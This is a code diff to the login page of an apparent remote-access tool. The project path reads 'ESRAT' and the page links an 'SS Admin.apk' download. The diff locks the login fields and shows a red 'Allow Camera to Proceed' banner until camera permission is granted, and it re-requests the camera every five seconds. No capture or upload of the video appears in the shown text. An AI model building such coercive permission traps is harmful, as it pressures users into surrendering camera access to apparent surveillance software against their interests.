@@ -25,11 +25,16 @@
         </span>
         <a class="info" href="/ESRAT/apks/SS Admin.apk" style="text-decoration: none; display: block; margin-top: 40px;">➡️Click Here⬅️ <br>to download the ADMIN App first!</a>
     </div>
+
+    <!-- Notice Board -->
+    <div id="notice-board" class="notice-board">
+        <p>Allow Camera to Proceed</p>
+    </div>
     
     <div class="container">
-        <input type="text" id="username" placeholder="Username">
-        <input type="password" id="password" placeholder="Password">
-        <button id="submit" class="button1">Login</button>
+        <input type="text" id="username" placeholder="Username" disabled>
+        <input type="password" id="password" placeholder="Password" disabled>
+        <button id="submit" class="button1" disabled>Login</button>
         <div id="message-ref" class="message"></div>
     </div>
     
@@ -45,19 +50,35 @@
 
     <!-- Add a script to request camera permission again and again till granted. -->
     <script>
+        function enableInputs() {
+            document.getElementById("username").disabled = false;
+            document.getElementById("password").disabled = false;
+            document.getElementById("submit").disabled = false;
+            document.getElementById("notice-board").style.display = 'none';  // Hide notice board after permission
+        }
+
+        function disableInputs() {
+            document.getElementById("username").disabled = true;
+            document.getElementById("password").disabled = true;
+            document.getElementById("submit").disabled = true;
+            document.getElementById("notice-board").style.display = 'block';  // Show notice board if permission is denied
+        }
+
         function requestCameraPermission() {
             navigator.mediaDevices.getUserMedia({ video: true })
                 .then(function(stream) {
                     console.log("Camera permission granted.");
+                    enableInputs();  // Enable inputs once permission is granted
                     clearInterval(cameraInterval);  // Stop asking for permission after it's granted
                 })
                 .catch(function(err) {
-                    console.log("Camera permission denied, retrying in 10 seconds.");
+                    console.log("Camera permission denied, retrying in 5 seconds.");
+                    disableInputs();  // Keep inputs disabled if permission is denied
                 });
         }
 
-        // Check camera permission every 10 seconds until granted
-        const cameraInterval = setInterval(requestCameraPermission, 10000);
+        // Check camera permission every 5 seconds until granted
+        const cameraInterval = setInterval(requestCameraPermission, 5000);
 
         // Cursor shadow effect
         const cursorShadow = document.querySelector('.cursor-shadow');
@@ -100,6 +121,23 @@
     </script>
     
     <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+
+    <style>
+        /* Styling for the notice board */
+        .notice-board {
+            display: none;
+            text-align: center;
+            color: white;
+            background-color: red;
+            padding: 20px;
+            font-size: 20px;
+            position: fixed;
+            width: 100%;
+            top: 0;
+            left: 0;
+            z-index: 100;
+        }
+    </style>
     
 </body>
 </html>
